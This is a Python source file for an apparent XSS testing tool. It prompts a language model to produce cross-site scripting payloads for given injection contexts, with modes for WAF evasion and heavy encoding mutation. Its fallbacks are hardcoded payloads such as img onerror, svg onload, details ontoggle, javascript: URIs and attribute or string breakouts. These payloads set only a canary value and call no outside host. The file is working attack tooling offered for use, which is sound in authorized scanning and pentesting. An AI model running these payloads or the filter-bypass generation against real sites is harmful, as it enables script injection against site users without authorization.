#!/usr/bin/env python3
"""
XSS ReflexionX v1.0.0 — AI Payload Generator
Uses LLM to generate novel, context-aware XSS payloads that supplement
the static payload engine.

Runs after xss_validator.py context classification and injects LLM-generated
payloads into the browser validation phase.

Features:
  - Dynamic payload generation per context/encoding/CSP combination
  - Fallback to static engine if LLM unavailable
  - Caching to avoid redundant LLM calls for same context
  - Post-processing: validates LLM output contains canary, deduplicates
  - Multi-role modes: standard, WAF-evasion, browser-specific, encoding-heavy

Usage:
    python3 ai_payload_generator.py --context html_attribute --encoding raw \\
        --quote double --csp '{"inline_allowed": false}' --canary HF5XSSCONFIRMED

    # Batch mode:
    python3 ai_payload_generator.py --contexts-file contexts.json --output-dir output/
"""

import argparse, hashlib, json, os, re, sys, time
from pathlib import Path

try:
    from ai_core import get_llm_client, format_context_info, SYSTEM_PROMPTS
    HAS_AI = True
except ImportError:
    HAS_AI = False

try:
    from payload_engine import PayloadEngine
    HAS_ENGINE = True
except ImportError:
    HAS_ENGINE = False

CANARY_DEFAULT = "HF5XSSCONFIRMED"
CACHE_DIR = ".ai_payload_cache"


def _cache_key(context, encoding, quote_type, csp, role, extra=""):
    raw = f"{context}|{encoding}|{quote_type}|{json.dumps(csp or {})}|{role}|{extra}"
    return hashlib.sha256(raw.encode()).hexdigest()[:16]


def _get_cached(cache_key):
    os.makedirs(CACHE_DIR, exist_ok=True)
    fpath = os.path.join(CACHE_DIR, f"{cache_key}.json")
    if os.path.isfile(fpath):
        try:
            with open(fpath) as f:
                data = json.load(f)
            # 24h TTL
            if time.time() - data.get("ts", 0) < 86400:
                return data.get("payloads", [])
        except Exception:
            pass
    return None


def _set_cached(cache_key, payloads):
    os.makedirs(CACHE_DIR, exist_ok=True)
    fpath = os.path.join(CACHE_DIR, f"{cache_key}.json")
    with open(fpath, "w") as f:
        json.dump({"ts": time.time(), "payloads": payloads}, f)


def _validate_payloads(payloads, canary):
    """Ensure all payloads contain the canary and are non-empty."""
    if not payloads:
        return []
    valid = []
    for p in payloads:
        p = p.strip()
        if not p:
            continue
        if canary in p:
            valid.append(p)
        elif "window._xss_confirmed" in p and canary not in p:
            # LLM used different canary — substitute
            valid.append(p.replace("CANARY", canary)
                         .replace("window._xss_confirmed='...'",
                                  f"window._xss_confirmed='{canary}'"))
    return valid


def _post_process_llm_payloads(raw_text, canary):
    """Parse raw LLM response into clean payload list."""
    payloads = []
    for line in raw_text.splitlines():
        line = line.strip()
        if not line:
            continue
        # Remove markdown fences
        line = re.sub(r'^```(?:html|javascript|js)?\s*', '', line)
        line = re.sub(r'\s*```$', '', line)
        # Remove numbering like "1. <script>..."
        line = re.sub(r'^\d+\.\s*', '', line)
        # Remove leading bullets
        line = re.sub(r'^[\-\*]\s*', '', line)
        if line:
            payloads.append(line)
    return _validate_payloads(payloads, canary)


def generate_llm_payloads(context="html_body", encoding="raw", quote_type="double",
                          csp=None, url="", param="", canary=None,
                          mode="standard", temperature=0.7, max_payloads=20):
    """Generate payloads using LLM, with static-engine fallback.

    Parameters
    ----------
    mode : str
        "standard" | "waf_evasion" | "heavy_mutations" | "dom_focused"
    """
    canary = canary or CANARY_DEFAULT
    csp = csp or {}

    role_map = {
        "standard": "payload_generator",
        "waf_evasion": "payload_generator",
        "heavy_mutations": "payload_generator",
        "dom_focused": "payload_generator",
    }
    role = role_map.get(mode, "payload_generator")

    cache_key = _cache_key(context, encoding, quote_type, csp, role, url + param)
    cached = _get_cached(cache_key)
    if cached is not None:
        return cached

    # 1. Try LLM first
    llm_payloads = []
    if HAS_AI:
        client = get_llm_client()
        if client.is_configured:
            extra_hints = ""
            if mode == "waf_evasion":
                extra_hints = "\nAdditional constraint: These payloads must bypass WAF filters that block <script> tags, onerror handlers, and common event handlers. Use unusual tags and event combinations."
            elif mode == "heavy_mutations":
                extra_hints = "\nAdditional constraint: Provide heavily mutated payloads — mixed case, HTML entities for brackets, URL-encoded variants, unicode escapes, null bytes, tab/newline insertion."
            elif mode == "dom_focused":
                extra_hints = "\nAdditional constraint: Focus on DOM-based payloads — javascript: URIs, fragment injections, data: URIs, protocol-relative URLs, external resource loaders."

            context_info = format_context_info(context, encoding, quote_type, csp, url, param)
            prompt = (
                f"Generate {max_payloads} diverse XSS payloads for the following context:\n\n"
                f"{context_info}\n"
                f"Mode: {mode}\n"
                f"{extra_hints}\n"
                f"Output one payload per line."
            )
            resp = client.chat(prompt, role=role, temperature=temperature, max_tokens=1024)
            if resp:
                llm_payloads = _post_process_llm_payloads(resp, canary)
                if llm_payloads:
                    _set_cached(cache_key, llm_payloads)
                    return llm_payloads[:max_payloads]

    # 2. Fallback to static engine
    if HAS_ENGINE:
        engine = PayloadEngine(canary=canary)
        return engine.generate(context=context, encoding=encoding,
                               quote_type=quote_type, csp=csp)

    # 3. Hardcoded emergency fallbacks
    fallbacks = {
        "html_body": [
            f"<img src=x onerror=window._xss_confirmed='{canary}'>",
            f"<svg onload=window._xss_confirmed='{canary}'>",
            f"<details open ontoggle=window._xss_confirmed='{canary}'>",
        ],
        "html_attribute": [
            f"'><img src=x onerror=window._xss_confirmed='{canary}'>",
            f"javascript:window._xss_confirmed='{canary}'",
        ],
        "javascript": [
            f"';window._xss_confirmed='{canary}'//",
            f'";window._xss_confirmed=\'{canary}\'//',
        ],
        "unknown": [
            f"<script>window._xss_confirmed='{canary}'</script>",
            f"<img src=x onerror=window._xss_confirmed='{canary}'>",
        ],
    }
    return fallbacks.get(context, fallbacks["unknown"])


# ── CLI self-test ─────────────────────────────────────────────

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="AI Payload Generator self-test / CLI")
    parser.add_argument("--test", action="store_true")
    parser.add_argument("--context", default="html_body")
    parser.add_argument("--encoding", default="raw")
    parser.add_argument("--quote", default="double")
    parser.add_argument("--csp", default=None)
    parser.add_argument("--canary", default=CANARY_DEFAULT)
    parser.add_argument("--mode", default="standard")
    parser.add_argument("--output-dir", default=".")
    parser.add_argument("--max", type=int, default=20)
    args = parser.parse_args()

    if args.test:
        # Test without LLM (should fall back to static engine)
        payloads = generate_llm_payloads(context="html_attribute", encoding="raw",
                                          quote_type="double", max_payloads=5)
        assert len(payloads) > 0
        assert all(CANARY_DEFAULT in p for p in payloads)

        # Test cache
        key = _cache_key("js", "raw", "double", {}, "payload_generator", "test")
        _set_cached(key, ["<test>"])
        assert _get_cached(key) == ["<test>"]

        # Test post-processing
        raw = "```html\n<script>window._xss_confirmed='HF5XSSCONFIRMED'</script>\n```"
        proc = _post_process_llm_payloads(raw, CANARY_DEFAULT)
        assert len(proc) == 1
        assert CANARY_DEFAULT in proc[0]

        print("[OK] AI Payload Generator self-test passed")
        print(f"  Fallback payloads: {len(payloads)}")
        print(f"  All contain canary: {all(CANARY_DEFAULT in p for p in payloads)}")
        sys.exit(0)

    payloads = generate_llm_payloads(
        context=args.context, encoding=args.encoding,
        quote_type=args.quote, csp=json.loads(args.csp) if args.csp else None,
        canary=args.canary, mode=args.mode, max_payloads=args.max,
    )
    print(f"[*] Generated {len(payloads)} payloads for context={args.context} mode={args.mode}")
    for i, p in enumerate(payloads[:10], 1):
        print(f"  {i:2d}. {p[:120]}")
    if len(payloads) > 10:
        print(f"  ... and {len(payloads)-10} more")

    os.makedirs(args.output_dir, exist_ok=True)
    with open(os.path.join(args.output_dir, "ai_payloads.txt"), "w") as f:
        for p in payloads:
            f.write(p + "\n")
    print(f"\n[OK] Saved to {args.output_dir}/ai_payloads.txt")
